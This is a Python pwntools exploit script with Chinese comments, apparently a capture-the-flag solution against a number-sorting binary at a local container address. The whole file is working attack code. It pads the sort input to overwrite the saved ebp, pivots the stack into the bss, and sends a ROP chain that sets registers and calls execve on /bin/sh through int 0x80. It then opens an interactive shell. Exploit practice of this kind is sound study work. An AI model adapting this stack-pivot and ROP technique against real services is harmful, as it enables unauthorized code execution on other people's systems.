#!/usr/bin/python
#coding:utf-8

from pwn import *

context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.2', 10001)

new_esp = 0x80eba84 				#sort函数中有个copy()，将数据复制到bss上，这个地址正好是bss+4*25
pop_edx_ecx_ebx = 0x0806fe00
pop_eax = 0x08052b14 
int80 = 0x0806da43 
getinp = 0x0804887c 
bss = 0x080eba20

io.sendlineafter("Enter the no. of elements to be sorted: ",'32')		#32个数据参与排序，正好可以覆盖到栈上的ebp

io.recvuntil("Give me the no. : ")

for i in range(25):
    io.send("0"*32)							#padding

io.send(str(getinp).ljust(32,'\x00'))		#栈劫持后跳转到函数getinp中读取ROP链
io.send(str(getinp+1).ljust(32,'\x00'))		#垃圾数据，+1保证数据在getinp和new_esp-8之间，防止被冒泡排序移动
io.send(str(new_esp-8).ljust(32,'\x00'))	#read()的参数buf，
io.send(str(new_esp-1).ljust(32,'\x00'))	#read()的参数size
io.send(str(new_esp-1).ljust(32,'\x00'))	#垃圾数据，防止被冒泡排序移动
io.send(str(new_esp-1).ljust(32,'\x00'))	#垃圾数据，防止被冒泡排序移动
io.sendline(str(new_esp))					#新的esp。sort函数中的栈溢出将栈中的ebp修改成新的esp，sort函数的leave(mov esp, ebp; pop ebp)将new_esp移动到ebp寄存器中，返回到main函数的leave(mov esp, ebp; pop ebp)将new_esp从ebp寄存器移动到esp寄存器中，完成栈劫持

payload = "/bin/sh\x00aaaaaaaa"	#"/bin/sh"字符串和填充数据
payload += p32(pop_eax)			#清除垃圾数据
payload += p32(bss)				#mov eax, [ebp+buf]; add eax, edx; mov byte ptr [eax], 0防止出错	
payload += p32(pop_edx_ecx_ebx)	#设置ebx, ecx, edx
payload += p32(0)				#edx = 0
payload += p32(0)				#ecx = 0
payload += p32(0x80eba7c)		#ebx = &("/bin/sh\x00")
payload += p32(pop_eax)			#设置eax寄存器
payload += p32(0xb)				#eax = 0xb
payload += p32(int80)			#调用int 80h执行sys_execve

sleep(0.1)
io.recv()
io.sendline(payload)
io.interactive()